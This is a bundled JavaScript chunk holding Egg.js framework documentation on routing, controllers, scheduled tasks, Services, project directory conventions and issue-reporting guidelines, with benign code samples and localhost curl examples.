  app.router.post('/form', app.controller.form.post);
};

// app/controller/form.js
exports.post = async (ctx) => {
  ctx.body = \`body: \${JSON.stringify(ctx.request.body)}\`;
};

// simulate a post request.
// curl -X POST http://127.0.0.1:7001/form --data '{"name":"controller"}' --header 'Content-Type:application/json'
`,paraId:27,tocIndex:9},{value:"P.S.:",paraId:28,tocIndex:9},{value:"If you perform a POST request directly, an ",paraId:29,tocIndex:9},{value:"error",paraId:29,tocIndex:9},{value:" will occur: 'secret is missing'. This error message comes from ",paraId:29,tocIndex:9},{value:"koa-csrf/index.js#L69",paraId:29,tocIndex:9},{value:".",paraId:29,tocIndex:9},{value:"Reason",paraId:30,tocIndex:9},{value:": the framework verifies the CSRF value specially for form POST requests, so please submit the CSRF key as well when you submit a form. Refer to ",paraId:30,tocIndex:9},{value:"Keep Away from CSRF Threat",paraId:30,tocIndex:9},{value:" for more detail.",paraId:30,tocIndex:9},{value:"Note",paraId:31,tocIndex:9},{value:": the verification is performed because the framework builds in a security plugin ",paraId:31,tocIndex:9},{value:"egg-security",paraId:31,tocIndex:9},{value:" that provides some default security practices and this plugin is enabled by default. In case you want to disable some security protections, just set the enable attribute to false.",paraId:31,tocIndex:9},{value:`"Unless you clearly confirm the consequence, it's not recommended to disable functions provided by the security plugin"`,paraId:32,tocIndex:9},{value:"Here we do the config temporarily in ",paraId:33,tocIndex:9},{value:"config/config.default.js",paraId:33,tocIndex:9},{value:" for an example",paraId:33,tocIndex:9},{value:`exports.security = {
  csrf: false
};
`,paraId:34,tocIndex:9},{value:`// app/router.js
module.exports = (app) => {
  app.router.post('/user', app.controller.user);
};

// app/controller/user.js
const createRule = {
  username: {
    type: 'email',
  },
  password: {
    type: 'password',
    compare: 're-password',
  },
};

exports.create = async (ctx) => {
  // throws exceptions if the verification fails
  ctx.validate(createRule);
  ctx.body = ctx.request.body;
};

// curl -X POST http://127.0.0.1:7001/user --data 'username=abc@abc.com&password=111111&re-password=111111'
`,paraId:35,tocIndex:10},{value:`// app/router.js
module.exports = (app) => {
  app.router.get('index', '/home/index', app.controller.home.index);
  app.redirect('/', '/home/index', 302);
};

// app/controller/home.js
exports.index = async (ctx) => {
  ctx.body = 'hello controller';
};

// curl -L http://localhost:7001
`,paraId:36,tocIndex:12},{value:`// app/router.js
module.exports = (app) => {
  app.router.get('/search', app.controller.search.index);
};

// app/controller/search.js
exports.index = async (ctx) => {
  const type = ctx.query.type;
  const q = ctx.query.q || 'nodejs';

  if (type === 'bing') {
    ctx.redirect(\`http://cn.bing.com/search?q=\${q}\`);
  } else {
    ctx.redirect(\`https://www.google.co.kr/search?q=\${q}\`);
  }
};

// curl http://localhost:7001/search?type=bing&q=node.js
// curl http://localhost:7001/search?q=node.js
`,paraId:37,tocIndex:13},{value:`A middleware can be used to change the request parameter to uppercase.
Here we just briefly explain how to use the middleware, and refer to `,paraId:38,tocIndex:14},{value:"Middleware",paraId:39,tocIndex:14},{value:" for detail.",paraId:38,tocIndex:14},{value:`// app/controller/search.js
exports.index = async (ctx) => {
  ctx.body = \`search: \${ctx.query.name}\`;
};

// app/middleware/uppercase.js
module.exports = () => {
  return async function uppercase(ctx, next) {
    ctx.query.name = ctx.query.name && ctx.query.name.toUpperCase();
    await next();
  };
};

// app/router.js
module.exports = (app) => {
  app.router.get(
    's',
    '/search',
    app.middleware.uppercase(),
    app.controller.search,
  );
};

// curl http://localhost:7001/search?name=egg
`,paraId:40,tocIndex:14},{value:"As described above, we do not recommend that you scatter routing logics all around, or it will bring trouble in trouble shooting.",paraId:41,tocIndex:15},{value:"If there is a need for some reasons, you can split routing rules like below:",paraId:42,tocIndex:15},{value:`// app/router.js
module.exports = (app) => {
  require('./router/news')(app);
  require('./router/admin')(app);
};

// app/router/news.js
module.exports = (app) => {
  app.router.get('/news/list', app.controller.news.list);
  app.router.get('/news/detail', app.controller.news.detail);
};

// app/router/admin.js
module.exports = (app) => {
  app.router.get('/admin/user', app.controller.admin.user);
  app.router.get('/admin/log', app.controller.admin.log);
};
`,paraId:43,tocIndex:15},{value:"or using ",paraId:44,tocIndex:15},{value:"egg-router-plus",paraId:44,tocIndex:15},{value:".",paraId:44,tocIndex:15}]},11296:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(34502);const t=[{value:"Although the HTTP Server we developed using the framework is a request-response model, there are still many scenarios that need to execute some scheduled tasks, for example:",paraId:0},{value:"Regularly report server application status.",paraId:1},{value:"Regularly update the local cache from the remote interface.",paraId:1},{value:"Regularly split files, delete temporary files.",paraId:1},{value:"The framework provides a mechanism to make the development and maintenance of scheduled tasks more elegant.",paraId:2},{value:"All scheduled tasks should be placed in directory ",paraId:3,tocIndex:0},{value:"app/schedule",paraId:3,tocIndex:0},{value:". Each file is an independent scheduled task that could configure the properties and the detail methods to be executed.",paraId:3,tocIndex:0},{value:"A simple example, to define a scheduled task to update the remote data to the memory cache, we can create a ",paraId:4,tocIndex:0},{value:"update_cache.js",paraId:4,tocIndex:0},{value:" file in the directory 'app/schedule`",paraId:4,tocIndex:0},{value:`const Subscription = require('egg').Subscription;

class UpdateCache extends Subscription {
  // using \`schedule\` property to set the scheduled task execution interval and other configurations
  static get schedule() {
    return {
      interval: '1m', // 1 minute interval
      type: 'all', // specify all \`workers\` need to execute
    };
  }

  // \`subscribe\` is the function to be executed when the scheduled task is triggered
  async subscribe() {
    const res = await this.ctx.curl('http://www.api.com/cache', {
      dataType: 'json',
    });
    this.ctx.app.cache = res.data;
  }
}

module.exports = UpdateCache;
`,paraId:5,tocIndex:0},{value:"Can also be abbreviated as",paraId:6,tocIndex:0},{value:`module.exports = {
  schedule: {
    interval: '1m', // 1 minute interval
    type: 'all', // specify all \`workers\` need to execute
  },
  async task(ctx) {
    const res = await ctx.curl('http://www.api.com/cache', {
      dataType: 'json',
    });
    ctx.app.cache = res.data;
  },
};
`,paraId:7,tocIndex:0},{value:"This scheduled task will be executed every 1 minute on every worker process, the requested remote data will be mounted back to ",paraId:8,tocIndex:0},{value:"app.cache",paraId:8,tocIndex:0},{value:".",paraId:8,tocIndex:0},{value:"task",paraId:9,tocIndex:1},{value:" or ",paraId:9,tocIndex:1},{value:"subscribe",paraId:9,tocIndex:1},{value:" is compatible with ",paraId:9,tocIndex:1},{value:"generator function",paraId:9,tocIndex:1},{value:" and ",paraId:9,tocIndex:1},{value:"async function",paraId:9,tocIndex:1},{value:".",paraId:9,tocIndex:1},{value:"The parameter of ",paraId:9,tocIndex:1},{value:"task",paraId:9,tocIndex:1},{value:" is ",paraId:9,tocIndex:1},{value:"ctx",paraId:9,tocIndex:1},{value:", anonymous Context instance, we could call ",paraId:9,tocIndex:1},{value:"service",paraId:9,tocIndex:1},{value:" and others via it.",paraId:9,tocIndex:1},{value:"Schedule tasks can specify ",paraId:10,tocIndex:2},{value:"interval",paraId:10,tocIndex:2},{value:" or ",paraId:10,tocIndex:2},{value:"cron",paraId:10,tocIndex:2},{value:" two different schedule modes.",paraId:10,tocIndex:2},{value:"interval",paraId:11},{value:"Configure the scheduled tasks by ",paraId:12,tocIndex:3},{value:"schedule.interval",paraId:12,tocIndex:3},{value:", scheduled tasks will be executed every specified time interval. ",paraId:12,tocIndex:3},{value:"interval",paraId:12,tocIndex:3},{value:" can be configured as",paraId:12,tocIndex:3},{value:"Integer type, the unit is milliseconds, e.g ",paraId:13,tocIndex:3},{value:"5000",paraId:13,tocIndex:3},{value:".",paraId:13,tocIndex:3},{value:"String type, will be transformed to milliseconds by ",paraId:13,tocIndex:3},{value:"ms",paraId:13,tocIndex:3},{value:", e.g ",paraId:13,tocIndex:3},{value:"5s",paraId:13,tocIndex:3},{value:".",paraId:13,tocIndex:3},{value:`module.exports = {
  schedule: {
    // executed every 10 seconds
    interval: '10s',
  },
};
`,paraId:14,tocIndex:3},{value:"cron",paraId:11},{value:"Configure the scheduled tasks by ",paraId:15,tocIndex:4},{value:"schedule.cron",paraId:15,tocIndex:4},{value:", scheduled tasks will be executed at specified timing according to the cron expressions. cron expressions are parsed by ",paraId:15,tocIndex:4},{value:"cron-parser",paraId:15,tocIndex:4},{value:".",paraId:15,tocIndex:4},{value:"Note: cron-parser supports second (which don't support by linux crontab).",paraId:16,tocIndex:4},{value:`*    *    *    *    *    *
\u252C    \u252C    \u252C    \u252C    \u252C    \u252C
\u2502    \u2502    \u2502    \u2502    \u2502    |
\u2502    \u2502    \u2502    \u2502    \u2502    \u2514 day of week (0 - 7) (0 or 7 is Sun)
\u2502    \u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500 month (1 - 12)
\u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of month (1 - 31)
\u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 hour (0 - 23)
\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 minute (0 - 59)
\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 second (0 - 59, optional)
`,paraId:17,tocIndex:4},{value:`module.exports = {
  schedule: {
    // executed every three hours (zero minutes and zero seconds)
    cron: '0 0 */3 * * *',
  },
};
`,paraId:18,tocIndex:4},{value:"The framework scheduled tasks support two types by default, worker and all. Both worker and all support the above two schedule modes, except when it comes time to execute, the worker who executes the scheduled tasks is different:",paraId:19,tocIndex:5},{value:"worker",paraId:20,tocIndex:5},{value:" type: only one worker per machine executes this scheduled task, the worker to execute is random.",paraId:20,tocIndex:5},{value:"all",paraId:20,tocIndex:5},{value:" type: each worker on each machine executes this scheduled task.",paraId:20,tocIndex:5},{value:"In addition to the parameters just introduced, scheduled task also supports these parameters:",paraId:21,tocIndex:6},{value:"cronOptions",paraId:22,tocIndex:6},{value:": configure cron time zone and so on, reference ",paraId:22,tocIndex:6},{value:"cron-parser",paraId:22,tocIndex:6},{value:"immediate",paraId:22,tocIndex:6},{value:": when this parameter is set to true, this scheduled task will be executed immediately after the application is started and ready.",paraId:22,tocIndex:6},{value:"disable",paraId:22,tocIndex:6},{value:": when this parameter is set to true, this scheduled task will not be executed.",paraId:22,tocIndex:6},{value:"env",paraId:22,tocIndex:6},{value:": env list to decide whether start this task at current env.",paraId:22,tocIndex:6},{value:"Schedule log will be written to ",paraId:23,tocIndex:7},{value:"${appInfo.root}/logs/{app_name}/egg-schedule.log",paraId:23,tocIndex:7},{value:", but won't be logged to terminal by default, you could customize via ",paraId:23,tocIndex:7},{value:"config.customLogger.scheduleLogger",paraId:23,tocIndex:7},{value:".",paraId:23,tocIndex:7},{value:`// config/config.default.js
config.customLogger = {
  scheduleLogger: {
    // consoleLevel: 'NONE',
    // file: path.join(appInfo.root, 'logs', appInfo.name, 'egg-schedule.log'),
  },
};
`,paraId:24,tocIndex:7},{value:"Sometimes we need to configure the parameters of scheduled tasks. Scheduled tasks support another development style:",paraId:25,tocIndex:8},{value:`module.exports = (app) => {
  return {
    schedule: {
      interval: app.config.cacheTick,
      type: 'all',
    },
    async task(ctx) {
      const res = await ctx.curl('http://www.api.com/cache', {
        contentType: 'json',
      });
      ctx.app.cache = res.data;
    },
  };
};
`,paraId:26,tocIndex:8},{value:"We can run a scheduled task via ",paraId:27,tocIndex:9},{value:"app.runSchedule(schedulePath)",paraId:27,tocIndex:9},{value:". ",paraId:27,tocIndex:9},{value:"app.runSchedule",paraId:27,tocIndex:9},{value:" reads a scheduled task file path (either a relative path in ",paraId:27,tocIndex:9},{value:"app/schedule",paraId:27,tocIndex:9},{value:" or a complete absolute path), executes the corresponding scheduled task, and returns a Promise.",paraId:27,tocIndex:9},{value:"There are some scenarios we may need to manually execute scheduled tasks, for example",paraId:28,tocIndex:9},{value:"Executing scheduled tasks manually for more elegant unit testing of scheduled tasks.",paraId:29,tocIndex:9},{value:`const mm = require('@eggjs/mock');
const assert = require('assert');

it('should schedule work fine', async () => {
  const app = mm.app();
  await app.ready();
  await app.runSchedule('update_cache');
  assert(app.cache);
});
`,paraId:30,tocIndex:9},{value:"When the application starts up, manually perform the scheduled tasks for system initialization, waiting for the initialization finished and then starting the application. See chapter ",paraId:31,tocIndex:9},{value:"Application Startup Configuration",paraId:32,tocIndex:9},{value:", we can implement initialization logic in ",paraId:31,tocIndex:9},{value:"app.js",paraId:31,tocIndex:9},{value:".",paraId:31,tocIndex:9},{value:`module.exports = (app) => {
  app.beforeStart(async () => {
    // ensure the data is ready before the application starts listening port
    // follow-up data updates automatically by the scheduled task
    await app.runSchedule('update_cache');
  });
};
`,paraId:33,tocIndex:9},{value:"The framework scheduled tasks only support single worker execution and all worker execution, in some cases, our services are not deployed on a single machine, one of the worker processes in the cluster may execute a scheduled task.",paraId:34,tocIndex:10},{value:"The framework does not provide this functionality directly, but developers can extend the new type of scheduled tasks themselves in the upper framework.",paraId:35,tocIndex:10},{value:"Inherit ",paraId:36,tocIndex:10},{value:"agent.ScheduleStrategy",paraId:36,tocIndex:10},{value:" in ",paraId:36,tocIndex:10},{value:"agent.js",paraId:36,tocIndex:10},{value:" and register it with ",paraId:36,tocIndex:10},{value:"agent.schedule.use()",paraId:36,tocIndex:10},{value:":",paraId:36,tocIndex:10},{value:`module.exports = (agent) => {
  class ClusterStrategy extends agent.ScheduleStrategy {
    start() {
      // subscribe other distributed scheduling service message, after receiving the message, allow a worker process to execute scheduled tasks
      // the user configures the distributed scheduling scenario in the configuration of the scheduled task
      agent.mq.subscribe(this.schedule.scene, () => this.sendOne());
    }
  }
  agent.schedule.use('cluster', ClusterStrategy);
};
`,paraId:37,tocIndex:10},{value:"ScheduleStrategy",paraId:38,tocIndex:10},{value:" base class provides:",paraId:38,tocIndex:10},{value:"this.schedule",paraId:39,tocIndex:10},{value:" - Properties of schedule tasks, ",paraId:39,tocIndex:10},{value:"disable",paraId:39,tocIndex:10},{value:" is supported by default, other configurations can be parsed by developers.",paraId:39,tocIndex:10},{value:"this.sendOne(...args)",paraId:39,tocIndex:10},{value:" - Notice worker to execute the task randomly, ",paraId:39,tocIndex:10},{value:"args",paraId:39,tocIndex:10},{value:" will pass to ",paraId:39,tocIndex:10},{value:"subscribe(...args)",paraId:39,tocIndex:10},{value:" or ",paraId:39,tocIndex:10},{value:"task(ctx, ...args)",paraId:39,tocIndex:10},{value:".",paraId:39,tocIndex:10},{value:"this.sendAll(...args)",paraId:39,tocIndex:10},{value:" - Notice all worker to execute the task.",paraId:39,tocIndex:10}]},2490:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(8907);const t=[{value:"Simply speaking, Service is an abstract layer which is used to encapsulate business logics in complex business circumstances, and this abstraction offers advantages as below:",paraId:0},{value:"keep logics in Controller cleaner.",paraId:1},{value:"keep business logics independent, since the abstracted Service can be called by many Controllers repeatedly.",paraId:1},{value:"separate logics and representations, and make it easier to write test cases. Write test cases in detail referring to ",paraId:1},{value:"here",paraId:2},{value:".",paraId:1},{value:"Processing complex data, e.g. information to be shown need to be got from databases, and should be processed in specific rules before it can be sent and seen by the user. Or when the process is done, the database should be updated.",paraId:3,tocIndex:0},{value:"Calling third party services, e.g. getting Github information etc.",paraId:3,tocIndex:0},{value:`// app/service/user.js
const Service = require('egg').Service;

class UserService extends Service {
  async find(uid) {
    const user = await this.ctx.db.query(
      'select * from user where uid = ?',
      uid,
    );
    return user;
  }
}

module.exports = UserService;
`,paraId:4,tocIndex:1},{value:"Framework will initialize a new Service instance for every request accessing the server, and, for the example above, several attributes are attached to ",paraId:5,tocIndex:2},{value:"this",paraId:5,tocIndex:2},{value:" since the Service class inherits ",paraId:5,tocIndex:2},{value:"egg.Service",paraId:5,tocIndex:2},{value:".",paraId:5,tocIndex:2},{value:"this.ctx",paraId:6,tocIndex:2},{value:": the instance of ",paraId:6,tocIndex:2},{value:"Context",paraId:7,tocIndex:2},{value:" for current request, through which we can access many attributes and methods, encapsulated by the framework, of current request conveniently.",paraId:6,tocIndex:2},{value:"this.app",paraId:6,tocIndex:2},{value:": the instance of ",paraId:6,tocIndex:2},{value:"Application",paraId:8,tocIndex:2},{value:" for current request, through which we can access global objects and methods provided by the framework.",paraId:6,tocIndex:2},{value:"this.service",paraId:6,tocIndex:2},{value:": ",paraId:6,tocIndex:2},{value:"Service",paraId:9,tocIndex:2},{value:" defined by the application, through which we can access the abstract business layer, equivalent to ",paraId:6,tocIndex:2},{value:"this.ctx.service",paraId:6,tocIndex:2},{value:".",paraId:6,tocIndex:2},{value:"this.config",paraId:6,tocIndex:2},{value:": the application's run-time ",paraId:6,tocIndex:2},{value:"config",paraId:10,tocIndex:2},{value:".",paraId:6,tocIndex:2},{value:"this.logger",paraId:6,tocIndex:2},{value:"\uFF1Alogger with ",paraId:6,tocIndex:2},{value:"debug",paraId:6,tocIndex:2},{value:"\uFF0C",paraId:6,tocIndex:2},{value:"info",paraId:6,tocIndex:2},{value:"\uFF0C",paraId:6,tocIndex:2},{value:"warn",paraId:6,tocIndex:2},{value:"\uFF0C",paraId:6,tocIndex:2},{value:"error",paraId:6,tocIndex:2},{value:", use to print different level logs, almost the same as ",paraId:6,tocIndex:2},{value:"context logger",paraId:11,tocIndex:2},{value:", but it will append Service file path for quickly track.",paraId:6,tocIndex:2},{value:"ctx",paraId:12},{value:"To get the path chain of user request, the request context is injected by us during the Service initialization, so you are able to get the related information of context directly by ",paraId:13,tocIndex:3},{value:"this.ctx",paraId:13,tocIndex:3},{value:" in methods. For detailed information about context, please refer to ",paraId:13,tocIndex:3},{value:"Context",paraId:14,tocIndex:3},{value:`.
With `,paraId:13,tocIndex:3},{value:"ctx",paraId:13,tocIndex:3},{value:", we can get various convenient attributes and methods encapsulated by the framework. For example we can use:",paraId:13,tocIndex:3},{value:"this.ctx.curl",paraId:15,tocIndex:3},{value:" to make network calls.",paraId:15,tocIndex:3},{value:"this.ctx.service.otherService",paraId:15,tocIndex:3},{value:" to call other Services.",paraId:15,tocIndex:3},{value:"this.ctx.db",paraId:15,tocIndex:3},{value:" to make database calls etc, where db may be a module mounted by other plugins in advance.",paraId:15,tocIndex:3},{value:"Service files must be put under the ",paraId:16,tocIndex:4},{value:"app/service",paraId:16,tocIndex:4},{value:" directory, and multi-level directory is supported, which can be accessed by cascading directory names.",paraId:16,tocIndex:4},{value:`app/service/biz/user.js => ctx.service.biz.user
app/service/sync_user.js => ctx.service.syncUser
app/service/HackerNews.js => ctx.service.hackerNews
`,paraId:17,tocIndex:4},{value:"one Service file can only define one Class, which should be returned by ",paraId:18,tocIndex:4},{value:"module.exports",paraId:18,tocIndex:4},{value:".",paraId:18,tocIndex:4},{value:"Service should be defined in the Class way, and the parent class must be ",paraId:18,tocIndex:4},{value:"egg.Service",paraId:18,tocIndex:4},{value:".",paraId:18,tocIndex:4},{value:"Service is not a singleton but a ",paraId:18,tocIndex:4},{value:"request level",paraId:18,tocIndex:4},{value:" object, the framework lazy-initializes it when the request ",paraId:18,tocIndex:4},{value:"ctx.service.xx",paraId:18,tocIndex:4},{value:" for the first time, so the context of current request can be got from this.ctx in Service.",paraId:18,tocIndex:4},{value:"We begin to see how to use Service from a complete example below.",paraId:19,tocIndex:5},{value:`// app/router.js
module.exports = (app) => {
  app.router.get('/user/:id', app.controller.user.info);
};

// app/controller/user.js
const Controller = require('egg').Controller;
class UserController extends Controller {
  async info() {
    const { ctx } = this;
    const userId = ctx.params.id;
    const userInfo = await ctx.service.user.find(userId);
    ctx.body = userInfo;
  }
}
module.exports = UserController;

// app/service/user.js
const Service = require('egg').Service;
class UserService extends Service {
  // the constructor is not a must by default
  // constructor(ctx) {
  //   super(ctx); if some processes should be made in the constructor, this statement is a must in order to use \`this.ctx\` later
  //   // get ctx through this.ctx directly
  //   // get app through this.app directly too
  // }
  async find(uid) {
    // suppose we've got user's id and are going to get detailed user information from databases
    const user = await this.ctx.db.query(
      'select * from user where uid = ?',
      uid,
    );

    // suppose some complex processes should be made here, and demanded informations are returned then.
    const picture = await this.getPicture(uid);

    return {
      name: user.user_name,
      age: user.age,
      picture,
    };
  }

  async getPicture(uid) {
    const result = await this.ctx.curl(\`http://photoserver/uid=\${uid}\`, {
      dataType: 'json',
    });
    return result.data;
  }
}
module.exports = UserService;

// curl http://127.0.0.1:7001/user/1234
`,paraId:20,tocIndex:5}]},7933:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(17351);const t=[{value:"In the ",paraId:0},{value:"Quick Start",paraId:1},{value:", we should have a preliminary impression on the framework, next let us simply understand the directory convention specification.",paraId:0},{value:`egg-project
\u251C\u2500\u2500 package.json
\u251C\u2500\u2500 app.js (optional)
\u251C\u2500\u2500 agent.js (optional)
\u251C\u2500\u2500 app
|   \u251C\u2500\u2500 router.js
\u2502   \u251C\u2500\u2500 controller
\u2502   |   \u2514\u2500\u2500 home.js
\u2502   \u251C\u2500\u2500 service (optional)
\u2502   |   \u2514\u2500\u2500 user.js
\u2502   \u251C\u2500\u2500 middleware (optional)
\u2502   |   \u2514\u2500\u2500 response_time.js
\u2502   \u251C\u2500\u2500 schedule (optional)
\u2502   |   \u2514\u2500\u2500 my_task.js
\u2502   \u251C\u2500\u2500 public (optional)
\u2502   |   \u2514\u2500\u2500 reset.css
\u2502   \u251C\u2500\u2500 view (optional)
\u2502   |   \u2514\u2500\u2500 home.tpl
\u2502   \u2514\u2500\u2500 extend (optional)
\u2502       \u251C\u2500\u2500 helper.js (optional)
\u2502       \u251C\u2500\u2500 request.js (optional)
\u2502       \u251C\u2500\u2500 response.js (optional)
\u2502       \u251C\u2500\u2500 context.js (optional)
\u2502       \u251C\u2500\u2500 application.js (optional)
\u2502       \u2514\u2500\u2500 agent.js (optional)
\u251C\u2500\u2500 config
|   \u251C\u2500\u2500 plugin.js
|   \u251C\u2500\u2500 config.default.js
\u2502   \u251C\u2500\u2500 config.prod.js
|   \u251C\u2500\u2500 config.test.js (optional)
|   \u251C\u2500\u2500 config.local.js (optional)
|   \u2514\u2500\u2500 config.unittest.js (optional)
\u2514\u2500\u2500 test
    \u251C\u2500\u2500 middleware
    |   \u2514\u2500\u2500 response_time.test.js
    \u2514\u2500\u2500 controller
        \u2514\u2500\u2500 home.test.js
`,paraId:2},{value:"As above, directories by conventions of framework:",paraId:3},{value:"app/router.js",paraId:4},{value:" used to configure URL routing rules, see ",paraId:4},{value:"Router",paraId:5},{value:" for details.",paraId:4},{value:"app/controller/**",paraId:4},{value:" used to parse the input from user, return the corresponding results after processing, see ",paraId:4},{value:"Controller",paraId:6},{value:" for details.",paraId:4},{value:"app/service/**",paraId:4},{value:" used for business logic layer, optional, recommend to use\uFF0Csee ",paraId:4},{value:"Service",paraId:7},{value:" for details.",paraId:4},{value:"app/middleware/**",paraId:4},{value:" uesd for middleware, optional, see ",paraId:4},{value:"Middleware",paraId:8},{value:" for details.",paraId:4},{value:"app/public/**",paraId:4},{value:" used to place static resources, optional, see built-in plugin ",paraId:4},{value:"egg-static",paraId:4},{value:" for details.",paraId:4},{value:"app/extend/**",paraId:4},{value:" used for extensions of the framework, optional, see ",paraId:4},{value:"Extend EGG",paraId:9},{value:" for details.",paraId:4},{value:"config/config.{env}.js",paraId:4},{value:" used to write configuration files, see ",paraId:4},{value:"Configuration",paraId:10},{value:" for details.",paraId:4},{value:"config/plugin.js",paraId:4},{value:" used to configure the plugins that need to be loaded, see ",paraId:4},{value:"Plugin",paraId:11},{value:" for details.",paraId:4},{value:"test/**",paraId:4},{value:" used for unit test, see ",paraId:4},{value:"Unit Test",paraId:12},{value:" for details.",paraId:4},{value:"app.js",paraId:4},{value:" and ",paraId:4},{value:"agent.js",paraId:4},{value:" are used to customize the initialization works at startup, see ",paraId:4},{value:"Application Startup Configuration",paraId:13},{value:" for details. For the role of ",paraId:4},{value:"agent.js",paraId:4},{value:" see ",paraId:4},{value:"Agent Mechanism",paraId:14},{value:".",paraId:4},{value:"Directories by conventions of built-in plugins:",paraId:15},{value:"app/public/**",paraId:16},{value:" used to place static resources, optional, see built-in plugin ",paraId:16},{value:"egg-static",paraId:16},{value:" for details.",paraId:16},{value:"app/schedule/**",paraId:16},{value:" used for scheduled tasks, optional, see ",paraId:16},{value:"Scheduled Task",paraId:17},{value:" for details.",paraId:16},{value:"To customize your own directory specification, see ",paraId:18},{value:"Loader API",paraId:19},{value:"app/view/**",paraId:20},{value:" used to place view files, optional, by view plugins conventions, see ",paraId:20},{value:"View Rendering",paraId:21},{value:" for details.",paraId:20},{value:"app/model/**",paraId:20},{value:" used to place the domain model, optional, by the domain related plugins conventions, such as ",paraId:20},{value:"egg-sequelize",paraId:20},{value:".",paraId:20}]},26490:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(33346);const t=[{value:"If you have any comment or advice, please report your ",paraId:0},{value:"issue",paraId:0},{value:`,
or make any change as you wish and submit a `,paraId:0},{value:"PR",paraId:0},{value:".",paraId:0},{value:"Please specify what kind of issue it is.",paraId:1,tocIndex:0},{value:"Before you report an issue, please search for related issues. Make sure you are not going to open a duplicate issue.",paraId:1,tocIndex:0},{value:"Explain your purpose clearly in tags(see ",paraId:1,tocIndex:0},{value:"Useful Tags",paraId:1,tocIndex:0},{value:"), title, or content.",paraId:1,tocIndex:0},{value:`Egg group members will confirm the purpose of the issue, replace more accurate tags for it, identify related milestone, and assign developers working on it.
Tags can be divided into two groups, `,paraId:2,tocIndex:0},{value:"type",paraId:2,tocIndex:0},{value:" and ",paraId:2,tocIndex:0},{value:"scope",paraId:2,tocIndex:0},{value:".",paraId:2,tocIndex:0},{value:"type: What kind of issue, e.g. ",paraId:3,tocIndex:0},{value:"feature",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"bug",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"documentation",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"performance",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"support",paraId:3,tocIndex:0},{value:" ...",paraId:3,tocIndex:0},{value:"scope: What did you modified. Which files are modified, e.g. ",paraId:3,tocIndex:0},{value:"core: xx",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"plugin: xx",paraId:3,tocIndex:0},{value:", ",paraId:3,tocIndex:0},{value:"deps: xx",paraId:3,tocIndex:0},{value:"support",paraId:4,tocIndex:1},{value:": the issue asks helps from developers of our group. If you need helps to locate and handle problems or have any idea to improve Egg, mark it as ",paraId:4,tocIndex:1},{value:"support",paraId:4,tocIndex:1},{value:".",paraId:4,tocIndex:1},{value:"bug",paraId:4,tocIndex:1},{value:": if you find a problem which possiblly could be a bug, please tag it as ",paraId:4,tocIndex:1},{value:"bug",paraId:4,tocIndex:1},{value:". Then our group members will review that issue. If it is confirmed as a bug by our group member, this issue will be tagged as ",paraId:4,tocIndex:1},{value:"confirmed",paraId:4,tocIndex:1},{value:`.
`,paraId:4,tocIndex:1},{value:"A confirmed bug will be resolved prior.",paraId:5,tocIndex:1},{value:"If the bug has negative impact on running online application, it will be tagged as ",paraId:5,tocIndex:1},{value:"critical",paraId:5,tocIndex:1},{value:", which refers to top priority, and will be fixed ASAP!",paraId:5,tocIndex:1},{value:"A bug will be fixed from lowest necessary version, e.g. A bug needs to be fixed from 0.9.x, then this issue will be tagged as ",paraId:5,tocIndex:1},{value:"0.9",paraId:5,tocIndex:1},{value:", ",paraId:5,tocIndex:1},{value:"0.10",paraId:5,tocIndex:1},{value:", ",paraId:5,tocIndex:1},{value:"1.0",paraId:5,tocIndex:1},{value:", ",paraId:5,tocIndex:1},{value:"1.1",paraId:5,tocIndex:1},{value:", referring that the bug is required to be fixed in those versions.",paraId:5,tocIndex:1},{value:"core: xx",paraId:4,tocIndex:1},{value:": the issue is related to core, e.g. ",paraId:4,tocIndex:1},{value:"core: loader",paraId:4,tocIndex:1},{value:" refers that the issue is related with ",paraId:4,tocIndex:1},{value:"loader",paraId:4,tocIndex:1},{value:" config.",paraId:4,tocIndex:1},{value:"plugin: xx",paraId:4,tocIndex:1},{value:": the issue is related to plugins. e.g. ",paraId:4,tocIndex:1},{value:"plugin: session",paraId:4,tocIndex:1},{value:" refers that the issue is related to ",paraId:4,tocIndex:1},{value:"session",paraId:4,tocIndex:1},{value:" plugin.",paraId:4,tocIndex:1},{value:"deps: xx",paraId:4,tocIndex:1},{value:": the issue is related to ",paraId:4,tocIndex:1},{value:"dependencies",paraId:4,tocIndex:1},{value:", e.g. ",paraId:4,tocIndex:1},{value:"deps:egg-cors",paraId:4,tocIndex:1},{value:" refers that the issue is related to ",paraId:4,tocIndex:1},{value:"egg-cors",paraId:4,tocIndex:1},{value:"chore: documentation",paraId:4,tocIndex:1},{value:": the issue is about documentation. Need to modify documentation.",paraId:4,tocIndex:1},{value:"All features must be submitted along with documentations. The documentations should satify several requirements.",paraId:6,tocIndex:2},{value:"Documentations must clarify one or more aspects of the feature, depending on the nature of feature: what it is, why it happens and how it works.",paraId:7,tocIndex:2},{value:"It's better to include a series of procedues to explain how to fix the problem. You are also encourgaed to provide ",paraId:7,tocIndex:2},{value:"simple, but self-explanatory",paraId:7,tocIndex:2},{value:` demo.
